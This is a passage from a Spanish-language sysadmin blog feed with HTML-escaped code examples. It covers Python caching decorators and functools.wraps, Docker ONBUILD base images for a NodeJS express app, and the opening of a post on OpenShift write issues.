    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;cache_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;cache_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;aux&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cache_data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;aux&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;aux&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;seconds&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;aux&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;cache_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper2&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper1&lt;/span&gt;

&lt;span class="nd"&gt;@cache_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;complex_math&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Started complex_math with n = &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;complex_math&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Ended complex_math with n = &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; with result = &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso tenemos las 3 funciones citadas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La función parametrizada (&lt;code&gt;cache_result&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;La función decoradora (&lt;code&gt;wrapper1&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;La función suplantante (&lt;code&gt;wrapper2&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cada vez que llamemos a la función &lt;code&gt;complex_math&lt;/code&gt;, en realidad vamos a estar llamando a la función &lt;code&gt;wrapper2&lt;/code&gt;, que va a poder acceder a los parámetros de las otras 2, siendo &lt;code&gt;func&lt;/code&gt; la función original decorada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/decorators$ ./big_math.py
&lt;span class="m"&gt;13&lt;/span&gt;:32:45 Started complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
&lt;span class="m"&gt;13&lt;/span&gt;:32:48 Ended complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; with &lt;span class="nv"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt;
&lt;span class="m"&gt;13&lt;/span&gt;:32:48 Started complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
&lt;span class="m"&gt;13&lt;/span&gt;:32:48 Ended complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; with &lt;span class="nv"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt;
&lt;span class="m"&gt;13&lt;/span&gt;:32:48 Started complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;5&lt;/span&gt;
&lt;span class="m"&gt;13&lt;/span&gt;:32:51 Ended complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;5&lt;/span&gt; with &lt;span class="nv"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt;
&lt;span class="m"&gt;13&lt;/span&gt;:32:51 Started complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
&lt;span class="m"&gt;13&lt;/span&gt;:32:54 Ended complex_math with &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; with &lt;span class="nv"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt;
gerard@atlantis:~/projects/decorators$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda verificar que el decorador hace realmente lo que deseábamos: &lt;em&gt;cachear&lt;/em&gt; la primera llamada con &lt;code&gt;n = 3&lt;/code&gt;, de forma que la segunda no tarda los 3 segundos de &lt;em&gt;delay&lt;/em&gt;. La tercera con la misma entrada se recalcula porque el tiempo de &lt;em&gt;cache&lt;/em&gt; se ha pasado mientras se hacía la llamanda con &lt;code&gt;n = 5&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Siendo correctos con la firma de la función&lt;/h2&gt;
&lt;p&gt;Cuando reemplazamos la función original por otra, no engañamos a nadie. Por ejemplo, en un caso simple como el siguiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decorator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

&lt;span class="nd"&gt;@decorator&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Toda ls información referente a la firma de la función sale de acuerdo a la nueva función.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/decorators$ ./no_wrap.py
wrapper
gerard@atlantis:~/projects/decorators$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este cambio de firma puede suponer un problema en algún momento futuro. Para eso, la librería estándar nos ofrece una forma de copiar la firma de la función a la función suplantante: un decorador llamado &lt;code&gt;wraps&lt;/code&gt; en el paquete &lt;code&gt;functools&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;functools&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decorator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="nd"&gt;@functools.wraps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

&lt;span class="nd"&gt;@decorator&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con este pequeño añadido nos evitamos el problema, ya que este se encarga de copiar el nombre de la función, los &lt;em&gt;docstrings&lt;/em&gt;, la lista de argumentos y otras propiedades desde la función decorada a la función suplantante.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/decorators$ ./wrap.py
myfunc
gerard@atlantis:~/projects/decorators$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Parece una tontería, pero puede evitarnos muchos problemas difíciles de diagnosticar en un futuro no muy lejano.&lt;/p&gt;</content><category term="python"></category><category term="decorador"></category></entry><entry><title>Creando imágenes con estilo: la instrucción ONBUILD</title><link href="http://www.linuxsysadmin.ml/2017/08/creando-imagenes-con-estilo-la-instruccion-onbuild.html" rel="alternate"></link><published>2017-08-28T10:00:00+02:00</published><updated>2017-08-28T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-08-28:/2017/08/creando-imagenes-con-estilo-la-instruccion-onbuild.html</id><summary type="html">&lt;p&gt;En el día a día de mi trabajo, me encuentro con un conjunto muy variado de ficheros &lt;em&gt;Dockerfile&lt;/em&gt; que vienen a hacer lo mismo, pero de formas muy distintas. El fichero original se pasa de mano en mano, pervirtiéndose en cada paso y al final queda hecho un gran asco …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En el día a día de mi trabajo, me encuentro con un conjunto muy variado de ficheros &lt;em&gt;Dockerfile&lt;/em&gt; que vienen a hacer lo mismo, pero de formas muy distintas. El fichero original se pasa de mano en mano, pervirtiéndose en cada paso y al final queda hecho un gran asco.&lt;/p&gt;
&lt;p&gt;Para evitar la reinvención de la rueda me propuse crear una imagen base, para que los desarrolladores no tuvieran que crear una imagen, que muchas veces está mal por falta de conocimiento de &lt;em&gt;Linux&lt;/em&gt;, y que reduzca al máximo su participación.&lt;/p&gt;
&lt;h2&gt;Un caso simple&lt;/h2&gt;
&lt;p&gt;Imaginemos una aplicación hecha con &lt;em&gt;NodeJS&lt;/em&gt;, que es el caso más frecuente en mi trabajo; nuestro flujo de trabajo exige el uso de &lt;em&gt;npm&lt;/em&gt; y del correspondiente &lt;em&gt;package.json&lt;/em&gt;. Una instalación básica es bastante simple: se trata de copiar la aplicación, ejecutar el &lt;code&gt;npm install&lt;/code&gt; de rigor y declarar que se va a ejecutar con &lt;code&gt;npm start&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Tomemos como ejemplo el básico de &lt;em&gt;express&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nodetest/v1$ cat app/app.js 
const &lt;span class="nv"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;express&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
const &lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; express&lt;span class="o"&gt;()&lt;/span&gt;

app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;req, res&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
  res.send&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hello World!&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;})&lt;/span&gt;

app.listen&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3000&lt;/span&gt;, &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
  console.log&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Example app listening on port 3000!&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;})&lt;/span&gt;
gerard@aldebaran:~/docker/nodetest/v1$ cat app/package.json 
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;app&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;main&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;app.js&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;scripts&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;node app.js&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;echo \&amp;quot;Error: no test specified\&amp;quot; &amp;amp;&amp;amp; exit 1&amp;quot;&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[]&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;author&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;ISC&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;dependencies&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;express&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;4.15.3&amp;quot;&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/nodetest/v1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siguiendo las instrucciones descritas más arriba, el &lt;em&gt;Dockerfile&lt;/em&gt; no guarda ninguna complicación:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nodetest/v1$ cat Dockerfile 
FROM node:6-slim
COPY app/ /srv/app/
WORKDIR /srv/app
RUN npm install --production
USER node
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;npm&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/nodetest/v1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este &lt;em&gt;Dockerfile&lt;/em&gt; nos genera una imagen adecuada, pero este fichero peca del mismo error que el resto: va a mutar un poco por cada mano por la que pase. Sin embargo, no podemos hacer una imagen base porque necesitamos la aplicación en la primera instrucción tras el &lt;strong&gt;FROM&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;La imagen base onbuild&lt;/h2&gt;
&lt;p&gt;Si miramos &lt;a href="https://docs.docker.com/engine/reference/builder/#onbuild"&gt;la documentación&lt;/a&gt;, podemos ver que podemos declarar algunas operaciones para que se lancen automáticamente tras todo &lt;strong&gt;FROM&lt;/strong&gt; que herede de nuestra imagen base. De esta forma, podemos declarar operaciones pendientes, al no disponer todavía de la aplicación final que va a tener que ejecutar nuestro contenedor.&lt;/p&gt;
&lt;p&gt;Vamos a retrasar la ejecución de todas aquellas instrucciones que dependan de la aplicación, que por cierto no está en este contexto, al no existir todavía:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nodetest/onbuild$ cat Dockerfile 
FROM node:6-slim
ONBUILD COPY app/ /srv/app/
ONBUILD WORKDIR /srv/app
ONBUILD RUN npm install --production
ONBUILD USER node
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;npm&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/nodetest/onbuild$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con este &lt;em&gt;Dockerfile&lt;/em&gt; podemos generar una imagen base, que registre nuestras operaciones pendientes. Si construimos la imagen, veremos que no se ejecuta el &lt;code&gt;npm install&lt;/code&gt;, ni las otras instrucciones precedidas por &lt;strong&gt;ONBUILD&lt;/strong&gt;. Cualquier &lt;em&gt;Dockerfile&lt;/em&gt; que extienda esta imagen base, conseguirá varias cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Va a disponer de todos los añadidos por instrucciones lanzadas sin el &lt;strong&gt;ONBUILD&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Inmediatamente tras el &lt;strong&gt;FROM&lt;/strong&gt; se van a ejecutar las operaciones indicadas en el &lt;strong&gt;ONBUILD&lt;/strong&gt; (el &lt;strong&gt;COPY&lt;/strong&gt;, el &lt;strong&gt;WORKDIR&lt;/strong&gt;, el &lt;strong&gt;RUN&lt;/strong&gt; y el &lt;strong&gt;USER&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;El desarrollador no necesita declarar todas estas operaciones; solo va a necesitar aquellas que sean específicas de su proyecto.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Veamos el mismo ejemplo de antes; creamos un contexto con la misma aplicación y un &lt;em&gt;Dockerfile&lt;/em&gt;, aunque este último queda bastante simplificado (suponiendo que la imagen base ha sido etiquetada como &lt;em&gt;gerard/node:onbuild&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nodetest/v2$ tree
.
├── app
│   ├── app.js
│   └── package.json
└── Dockerfile

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;3&lt;/span&gt; files
gerard@aldebaran:~/docker/nodetest/v2$ cat Dockerfile 
FROM gerard/node:onbuild
gerard@aldebaran:~/docker/nodetest/v2$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si la construimos, vemos que justo tras acabar el paso del &lt;strong&gt;FROM&lt;/strong&gt;, van a saltar de forma automática los &lt;em&gt;triggers&lt;/em&gt;  declarados por la instrucción &lt;strong&gt;ONBUILD&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nodetest/v2$ docker build -t gerard/app:v2 .
Sending build context to Docker daemon  &lt;span class="m"&gt;4&lt;/span&gt;.608kB
Step &lt;span class="m"&gt;1&lt;/span&gt;/1 : FROM gerard/node:onbuild
&lt;span class="c1"&gt;# Executing 4 build triggers...&lt;/span&gt;
Step &lt;span class="m"&gt;1&lt;/span&gt;/1 : COPY app/ /srv/app/
Step &lt;span class="m"&gt;1&lt;/span&gt;/1 : WORKDIR /srv/app
Step &lt;span class="m"&gt;1&lt;/span&gt;/1 : RUN npm install --production
 ---&amp;gt; Running in e3fe9e739e34
...  
Step &lt;span class="m"&gt;1&lt;/span&gt;/1 : USER node
 ---&amp;gt; Running in 3725eb574aff
 ---&amp;gt; d4661e9857e8
Removing intermediate container 7c9b3293ed2f
Removing intermediate container 7976c2b5aaaa
Removing intermediate container e3fe9e739e34
Removing intermediate container 3725eb574aff
Successfully built d4661e9857e8
Successfully tagged gerard/app:v2
gerard@aldebaran:~/docker/nodetest/v2$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto aseguramos que el desarrollador pasa por el aro, usando las instrucciones que realmente necesitamos para ejecutar la aplicación.&lt;/p&gt;</content><category term="docker"></category><category term="dockerfile"></category><category term="onbuild"></category></entry><entry><title>Problemas de escritura con openshift</title><link href="http://www.linuxsysadmin.ml/2017/08/problemas-de-escritura-con-openshift.html" rel="alternate"></link><published>2017-08-21T10:00:00+02:00</published><updated>2017-08-21T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-08-21:/2017/08/problemas-de-escritura-con-openshift.html</id><summary type="html">&lt;p&gt;En mi trabajo se ha decidido por el uso de virtualización por contenedores usando &lt;strong&gt;Openshift&lt;/strong&gt;. No es nada demasiado nuevo, puesto que ya usábamos &lt;strong&gt;Docker&lt;/strong&gt; de manera habitual, pero ha habido alguna &lt;em&gt;feature&lt;/em&gt; que nos ha hecho plantearnos el modo en el que hacemos las cosas, especialmente para las escrituras …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En mi trabajo se ha decidido por el uso de virtualización por contenedores usando &lt;strong&gt;Openshift&lt;/strong&gt;. No es nada demasiado nuevo, puesto que ya usábamos &lt;strong&gt;Docker&lt;/strong&gt; de manera habitual, pero ha habido alguna &lt;em&gt;feature&lt;/em&gt; que nos ha hecho plantearnos el modo en el que hacemos las cosas, especialmente para las escrituras.&lt;/p&gt;
